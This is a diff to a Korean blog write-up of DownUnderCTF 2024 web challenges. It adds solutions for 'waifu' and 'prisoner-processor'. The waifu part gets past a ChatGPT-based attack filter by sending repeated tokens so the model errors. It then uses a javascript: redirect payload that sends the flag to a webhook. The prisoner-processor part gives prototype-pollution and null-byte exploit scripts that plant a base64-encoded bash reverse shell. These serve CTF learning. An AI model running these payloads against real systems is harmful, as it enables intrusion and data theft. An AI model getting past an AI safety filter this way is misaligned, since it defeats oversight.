@@ -15,8 +15,12 @@ category: ctf
       
 <img src="/assets/images/ctf/2024/downunder/scoreboard.jpg" width="700px">           
         
+처음으로 RubiyaLab 사람들과 함께 CTF에 참여하게 되었고, 47등으로 마무리하게 되었다. 
+
 <img src="/assets/images/ctf/2024/downunder/web.jpg" width="700px">       
-                   
+                     
+웹은 Beginner 문제를 포함해 총 9문제가 나왔고, 그 중 6문제를 풀었다. 평소엔 거의 혼자 웹을 풀다가 이번엔 팀원들과 같이 소통하며 문제를 해결했더니 서로 도움이 되었던 것 같다. 다음엔 더 어려운 난이도의 문제를 해결하는 것을 목표로 열심히 해야겠다는 생각이 들었다.         
+
 ## Writeup   
      
 - <a href="#parrot-the-emu">parrot the emu</a>     
@@ -722,8 +726,7 @@ foreach(scandir('audio/') as $v) {
 </body>
 </html>
 ``` 
-`session_start()` 세션이 생성되면, `/tmp/sess_{PHPSESSID}` 파일에 세션 값들이 저장된다.    
-`theme` 파라미터를 통해 `/tmp/sess_{PHPSESSID}` 파일에 입력 값들을 쓸 수 있다.    
+`session_start()` 세션이 생성되면, `/tmp/sess_{PHPSESSID}` 파일에 세션 값들이 저장된다. `theme` 파라미터를 통해 `/tmp/sess_{PHPSESSID}` 파일에 입력 값들을 쓸 수 있다.    
        
 ```php
 <?php
@@ -746,7 +749,7 @@ readfile($file);
 ```    
 `f` 파라미터에서 `Local File Inclusion` 취약점이 발생한다. 하지만, `mime_content_type()` MIME 타입 값이 `audio`로 시작하지 않으면 파일을 읽을 수 없다. 플래그가 포함된 `/tmp/sess_{PHPSESSID}` 파일을 읽기 위해서 해당 파일의 MIME 타입이 `audio`가 되도록 해야한다.     
 
-대회 당시에 굉장히 많은 삽질을 하며 결국 풀지 못했다. 
+대회 당시에 굉장히 많은 삽질을 하며 결국 풀지 못했다.   
 
 ```bash
 21  string/c    \!SCREAM!   audio/x-mod
@@ -977,33 +980,359 @@ const waifuMiddleware = async (req: Request, res: Response, next: NextFunction) 
 export default waifuMiddleware
 ```      
 `waifuMiddleware`는 유저 입력 값에 대해 raw 데이터를 활용해 다시 HTTP Request를 만든다. 만들어진 요청은 chatGPT에게 전달되고 해킹 시도를 하는지 판단하여 결과 값을 반환한다.     
+     
+https://dropbox.tech/machine-learning/bye-bye-bye-evolution-of-repeated-token-attacks-on-chatgpt-models
+       
+하지만, 위 내용에 따르면 chatGPT 3.5 버전에서 반복된 값을 전달하면 민감한 정보를 추출할 수 있는 취약점이 발견되었다고 한다.    
+해당 취약점은 패치되어 반복된 값에 대해 "Invalid Request" 응답을 반환한다. 즉, 반복된 값을 입력해 예외를 발생시켜 waifuMiddleware를 우회할 수 있다.    
 
-routes/flag.ts
+`/auth/?bypass=%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61%61&redirectTo=`        
+        
 ```typescript
-import { Request, Response, Router } from "express";
-import authMiddleware from "../middleware/auth";
-import { sendResponse } from "../utils/response";
+import { Response } from "express";
+import { encode } from "html-entities";
 
-const router = Router();
-router.use(authMiddleware);
+const BROWSER_REDIRECT = `<html>
+    <body>
+        <script>
+            window.location = "{REDIRECT}";
+        </script>
+    </body>
+</html>`;
 
-router.get("/", (req: Request, res: Response) => {
-    res.sendFile("flag.html", { root: "html" });
-})
+const sendError = (res: Response, status: number, message: string) => {
+    res.status(status).send({status: "error", data: {error: message}});
+}
 
-router.get('/get', (req: Request, res: Response) => {
-    sendResponse(res, { message: process.env.FLAG })
-})
+const sendResponse = (res: Response, data: object) => {
+    res.status(200).send({status: "success", data: data});
+}
 
-export default router
+// Helpful at mitigating against other bots scanning for open redirect vulnerabilities
+const sendBrowserRedirectResponse = (res: Response, redirectTo: string) => {
+    const defaultRedirect = `${process.env.BASE_URL}/flag/`;
+    if (typeof redirectTo !== "string") {
+        redirectTo = defaultRedirect;
+    }
+
+    const redirectUrl = new URL(redirectTo as string, process.env.BASE_URL);
+    // Prevent open redirect
+    if ((redirectUrl.hostname ?? '') !== new URL(defaultRedirect).hostname) {
+        redirectTo = defaultRedirect;
+    }
+
+    const encodedRedirect = encode(redirectTo);
+    res.send(BROWSER_REDIRECT.replace("{REDIRECT}", encodedRedirect));
+}
+
+export { sendError, sendResponse, sendBrowserRedirectResponse }
+```        
+다음으로, 리다이렉션 기능이 존재하는데 Hostname이 동일한지 체크하고 리다이렉션을 허용한다. 하지만, scheme에 대한 검증이 이루어지고 있지 않아 `javascript://`를 사용해 스크립트를 실행시킬 수 있는 취약점이 발생한다. `fetch('/flag/get')` 요청을 보내 플래그 값을 읽은 후, 웹훅으로 전달해주면 된다.     
+         
+### Exploit Code     
+```python
+import base64
+
+b64 = base64.b64encode(b"fetch('/flag/get').then(r => r.text()).then(text=>fetch('https://webhook.site/3e37a354-b43f-4e0a-8bdc-2bf1a5293e9f',{method:'POST',body:text}))").decode()
+
+bot_url = "https://web-waifu-ea0bd3796efa3446.2024.ductf.dev"
+
+url = "/auth/?bypass=" + "%61" * 400 + f"&redirectTo=javascript://127.0.0.1:3000/%250aeval(atob(%2522{b64}%2522))"
+print(url) 
 ```       
-`/flag/get`
+       
+### Flag 
+DUCTF{t0kN_tOOooOOO0Kn_tooKN_t000000000Kn_x60_OwO_w0t_d15_n0_w4F?????questionmark???}      
+       
 
 <a id="prisoner-processor"></a>           
       
 # prisoner-processor     
            
 17 solved / 325 pts      
-       
-                        
+        
+```typescript
+import { Hono } from 'hono';
+import { bodyLimit } from 'hono/body-limit';
+import { zValidator } from '@hono/zod-validator'
+import { z } from 'zod';
+import { createHmac, randomBytes } from 'crypto';
+import { readFileSync, existsSync } from 'fs';
+import { stringify } from 'yaml';
 
+const SECRET_KEY = randomBytes(64);
+const SIGNED_PREFIX = "signed.";
+const OUTPUT_YAML_FOLDER = "/app-data/yamls";
+const BANNED_STRINGS = [
+  "app", "src", ".ts", "node", "package", "bun", "home", "etc", "usr", "opt", "tmp", "index", ".sh"
+];
+
+const app = new Hono();
+
+const cache: any = {};
+
+const getSignature = (data: any): string => {
+  const toSignArray = Object.entries(data).map(([k, v]) => `${k}=${v}`);
+  toSignArray.sort();
+  return createHmac('sha256', SECRET_KEY)
+    .update(toSignArray.join("&"))
+    .digest("hex");
+};
+
+const hasValidSignature = (data: any, signature: string): boolean => {
+  const signedInput = getSignature(data);
+  return signedInput === signature
+};
+
+const getSignedData = (data: any): any => {
+  const signedParams: any = {};
+  for (const param in data) {
+    if (param.startsWith(SIGNED_PREFIX)) {
+      const keyName = param.slice(SIGNED_PREFIX.length);
+      signedParams[keyName] = data[param];
+    }
+  }
+  return signedParams;
+};
+
+...
+
+app.post('/convert-to-yaml',
+  bodyLimit({
+    maxSize: 50 * 1024, // 50kb limit
+  }),
+  zValidator('json', requestSchema),
+  (c) => {
+    try {
+      const body = c.req.valid('json');
+      const data = body.data;
+      const signedData = getSignedData(data)
+      const signature = body.signature;
+      if (!hasValidSignature(signedData, signature)) {
+        return c.json({ msg: "signatures do no match!" }, 400);
+      }
+      const outputPrefix = z.string().parse(signedData.outputPrefix ?? "prisoner");
+      const outputFile = `${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`;
+      if (convertJsonToYaml(data, outputFile)) {
+        return c.json({ msg: outputFile });
+      } else {
+        return c.json({ msg: "failed to convert JSON" }, 500);
+      }
+    } catch (error) {
+      console.error(error);
+      return c.json({ msg: "why you send me a bad request???" }, 400);
+    }
+  }
+);
+```        
+JSON 데이터를 입력받아 `getSignedData()` 함수에서 `signed.`로 시작하는 키와 값을 객체에 저장한다. 만일 유저가 키 이름을 `signed.__proto__`로 설정하면, `signedParams[__proto__] = data[param]` 구문이 실행되어 Prototype Pollution 취약점이 발생한다. 추가적으로, `getSignature()`에서 `Object.entries()`를 사용하고 있어 `__proto__` 객체 속성 값은 포함이 되지 않기 때문에 `hasValidSignature()`로 객체 데이터를 검증 또한 우회가 가능하다.  
+
+```json
+{
+    "data": {
+        "signed.name": "jeff",
+        "signed.animalType": "emu",
+        "signed.age": 12,
+        "signed.crime": "assault",
+        "signed.description": "clotheslined someone with their neck",
+        "signed.start": "2024-03-02T10:45:01Z",
+        "signed.release": "2054-03-02T10:45:01Z",
+        "signed.__proto__": {
+            "outputPrefix": "hacked"
+        }
+    },
+    "signature": "5c9396d88b7765d1c69dd949adfcc1f82ed766cbf534c16297eed346a4b453f5"
+}
+```          
+`/examples` 엔드포인트에서 일부 데이터를 가져와 `signed.__proto__` 부분을 추가해 `outputPrefix` 속성 값을 변조시킬 수 있다. 
+
+```typescript
+const outputFile = `${outputPrefix}-${randomBytes(8).toString("hex")}.yaml`;
+```
+하지만, YAML 파일 이름을 지정할 때, `randomBytes(8).toString("hex")`로 랜덤한 hex 값을 생성하고 있어 이 부분 또한 우회가 필요하다.      
+         
+```typescript
+const convertJsonToYaml = (data: any, outputFileString: string): boolean => {
+  if (checkIfContainsBannedString(outputFileString)) {
+    return false
+  }
+  const filePath = `${OUTPUT_YAML_FOLDER}/${outputFileString}`;
+  const outputFile = Bun.file(filePath);
+  // Prevent accidental overwriting of app files
+  if (existsSync(outputFile)) {
+    return false
+  }
+
+  try {
+    const yamlData = stringify(data);
+    Bun.write(outputFile, yamlData);
+    return true;
+  } catch (error) {
+    console.error(error)
+    return false;
+  }
+};
+```
+파일 생성 시 `const outputFile = Bun.file(filePath);`로 `BunFile` 인스턴스를 생성해 `Bun.write(outputFile, yamlData);`를 수행한다. 여기서 주목할 부분은 **Bun.js**는 **Zig Programming Language**를 사용해 만들어졌다는 점이다. **Zig**는 **\x00** null byte를 사용해 문자열의 끝을 알아내기 때문에 **Bun**에서 파일 경로에 null byte를 삽입하면, null byte 이후 문자열이 모두 잘리게 되는 문제가 존재하여 `outputPrefix`에 `\x00`를 삽입하면 뒤에 랜덤한 hex 값을 삭제시킬 수 있다.     
+     
+```typescript
+const BANNED_STRINGS = [
+  "app", "src", ".ts", "node", "package", "bun", "home", "etc", "usr", "opt", "tmp", "index", ".sh"
+];
+
+... 
+const checkIfContainsBannedString = (outputFile: string): boolean => {
+  for (const banned of BANNED_STRINGS) {
+    if (outputFile.includes(banned)) {
+      return true
+    }
+  }
+  return false;
+}
+```     
+단, `checkIfContainsBannedString()` 함수 내에서 파일 경로가 `BANNED_STRINGS` 리스트에 등록된 키워드가 포함되는지 확인하고 있기 때문에 해당 키워드가 포함된 결과 파일은 생성할 수 없다. 그러므로, `/app/src/index.ts` 파일을 덮어쓸 수 없는 상태이다. 하지만, `bun` 프로세스에서 `/app/src/index.ts` 파일에 연결된 File Descriptor를 통해 우회가 가능하다.         
+                 
+```bash
+$ ls -al /proc
+total 4
+dr-xr-xr-x 216 root root     0 Jul 10 15:54 .
+drwxr-xr-x   1 root root  4096 Jul 10 15:54 ..
+-rw-r--r--   1 root root     0 Jul 10 15:59 .reset
+dr-xr-xr-x   8 bun  bun      0 Jul 10 15:54 1
+dr-xr-xr-x   8 bun  bun      0 Jul 10 15:57 32
+dr-xr-xr-x   8 bun  bun      0 Jul 10 15:59 74
+dr-xr-xr-x   8 bun  bun      0 Jul 10 15:54 8
+dr-xr-xr-x   8 bun  bun      0 Jul 10 15:54 9
+...
+```
+도커 환경에서 `/proc` 디렉터리 리스트를 보면, `bun` 계정으로 실행되고 있는 프로세스가 총 5개가 존재한다.    
+
+```bash
+$ cd /proc/9/fd 
+$ ls -al
+total 0
+dr-x------ 2 bun bun 24 Jul 10 15:54 .
+dr-xr-xr-x 8 bun bun  0 Jul 10 15:54 ..
+lrwx------ 1 bun bun 64 Jul 10 16:00 0 -> /dev/null
+l-wx------ 1 bun bun 64 Jul 10 16:00 1 -> 'pipe:[17332]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 10 -> 'anon_inode:[timerfd]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 11 -> 'anon_inode:[timerfd]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 12 -> 'anon_inode:[timerfd]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 13 -> 'anon_inode:[eventpoll]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 14 -> 'anon_inode:[timerfd]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 15 -> 'anon_inode:[eventfd]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 16 -> 'anon_inode:[timerfd]'
+l--------- 1 bun bun 64 Jul 10 16:00 17 -> /home/bun/.bun/install/cache
+l--------- 1 bun bun 64 Jul 10 15:54 19 -> /tmp
+l-wx------ 1 bun bun 64 Jul 10 16:00 2 -> 'pipe:[17333]'
+lr-x------ 1 bun bun 64 Jul 10 15:54 20 -> /home/bun/.bun/install/cache/hono@4.4.12@@@1
+lr-x------ 1 bun bun 64 Jul 10 15:54 21 -> /home/bun/.bun/install/cache/@hono/zod-validator@0.2.2@@@1
+lr-x------ 1 bun bun 64 Jul 10 15:54 22 -> /home/bun/.bun/install/cache/zod@3.23.8@@@1
+lr-x------ 1 bun bun 64 Jul 10 15:54 23 -> /home/bun/.bun/install/cache/yaml@2.4.5@@@1
+lrwx------ 1 bun bun 64 Jul 10 16:00 24 -> 'socket:[15078]'
+lr-x------ 1 bun bun 64 Jul 10 16:00 3 -> /app/src/index.ts
+lr-x------ 1 bun bun 64 Jul 10 16:00 4 -> /dev/urandom
+lr-x------ 1 bun bun 64 Jul 10 16:00 5 -> /dev/urandom
+lr-x------ 1 bun bun 64 Jul 10 16:00 6 -> /proc/9/statm
+lrwx------ 1 bun bun 64 Jul 10 16:00 7 -> 'anon_inode:[eventpoll]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 8 -> 'anon_inode:[timerfd]'
+lrwx------ 1 bun bun 64 Jul 10 16:00 9 -> 'anon_inode:[eventfd]'
+```     
+그 중 PID 값이 9인 프로세스와 연결된 File Descriptor를 보면, 3번째 File Descriptor가 `/app/src/index.ts`를 가리키고 Symbolic Link가 걸려있는 것을 확인할 수 있다. 다시 말해, `/proc/self/fd/3`에 RCE 코드를 써주면 `/app/src/index.ts` 파일을 덮어쓸 수 있다.    
+     
+```json
+{
+    "data": {
+        "const a": "string = Bun.spawnSync({cmd:[\"bash\",\"-c\",\"echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC97cmhvc3R9L3tycG9ydH0gMD4mMQo=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS}-i\"]})/*",
+        "signed.name": "jeff",
+        "signed.animalType": "emu",
+        "signed.age": 12,
+        "signed.crime": "assault",
+        "signed.description": "clotheslined someone with their neck",
+        "signed.start": "2024-03-02T10:45:01Z",
+        "signed.release": "2054-03-02T10:45:01Z",
+        "signed.__proto__": {
+            "outputPrefix": "../../proc/self/fd/3\x00"
+        },
+        "asdf": "asdf*/"
+    },
+    "signature": "5c9396d88b7765d1c69dd949adfcc1f82ed766cbf534c16297eed346a4b453f5"
+}
+```               
+
+JSON 데이터를 YAML 형식으로 변환 했을 때, Typescript가 Syntax를 이해할 수 있도록 하기 위해 RCE 코드를 제외하고 다른 부분들은 `/**/` 주석 처리해야한다.             
+      
+```typescript
+const a:string = Bun.spawnSync({cmd:["bash","-c","echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMy4xMjQuMTc1LjExNC84MDAwIDA+JjEK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS}-i"]})/*
+signed.name: jeff
+signed.animalType: emu
+signed.age: 12
+signed.crime: assault
+signed.description: clotheslined someone with their neck
+signed.start: 2024-03-02T10:45:01Z
+signed.release: 2054-03-02T10:45:01Z
+signed.__proto__:
+  outputPrefix: "../../proc/self/fd/3\0"
+asdf: asdf */
+```    
+     
+결과적으로, `/app/src/index.ts` 파일에 위 내용이 덮어쓰이게 되어 리버스 쉘 페이로드를 실행시킬 수 있다. 하지만, 웹 서버는 이미 이전 코드를 빌드해서 배포하고 있기 때문에 웹 서버를 재기동 시켜줘야 한다. 공식 풀이에서는 "Crash hono/bodyLimit By Phat File" 또는 "Crash bun By Failing open syscall" 방법을 사용하여 웹 서버를 재가동 시킬 수 있다고 한다.    
+        
+1. Crash hono/bodyLimit By Phat File     
+    `/dev/urandom` 파일과 같은 malformed JSON 데이터를 전송하여 `hono/bodyLimit`에 crash가 발생해 예외를 발생시키는 방법  
+          
+    https://github.com/honojs/hono/blob/d87d9964433a4777b09abff9360ff12643d00440/src/validator/validator.ts#L78     
+    
+    ```bash
+    curl -F 'file=@/dev/urandom' -H 'Content-Type: application/json' -X POST http://localhost:3000/convert-to-yaml
+    ```
+ 
+2. Crash bun By Failing open syscall    
+`Bun.File()` 실행 시, `open syscall`을 호출하게 되는데 Escape Character가 포함된 잘못된 파일 경로를 전달하여 crash를 발생시키는 방법 (예를 들어, `../../proc/self/fd/3\x`)    
+    
+### Exploit Code         
+    
+```python
+import requests, base64
+ 
+url = "https://web-prisoner-processor-827ee556e12a3f35.2024.ductf.dev"
+rhost = "server ip"
+rport = "server port"
+
+r = requests.get( 
+    f"{url}/examples"
+)
+
+base = r.json()["examples"][0] 
+
+# Path Traversal & index.ts overwrite
+base["data"]["signed.__proto__"] = {
+    "outputPrefix" : "../../proc/self/fd/3\x00"
+}
+
+cmd = f"bash -i >& /dev/tcp/{rhost}/{rport} 0>&1"
+
+payload = {
+    "data": {
+        "const a": "string = Bun.spawnSync({cmd:[\"bash\",\"-c\",\"echo${IFS}" + \
+        base64.b64encode(cmd.encode()).decode() + \
+        "${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS}-i\"]})/*",
+        **base["data"],
+        "asdf": "asdf*/"                       
+    },
+    "signature": base["signature"]
+}
+
+r = requests.post(
+    f"{url}/convert-to-yaml", json=payload
+)
+
+base["data"]["signed.__proto__"]["outputPrefix"] = "../../proc/self/fd/3\\x"
+r = requests.post(
+    f"{url}/convert-to-yaml", json=payload
+)
+```    
+
+### Flag    
+DUCTF{bUnBuNbUNbVN_hOn0_tH15_aPp_i5_d0n3!!!one1!!!!}     
+               
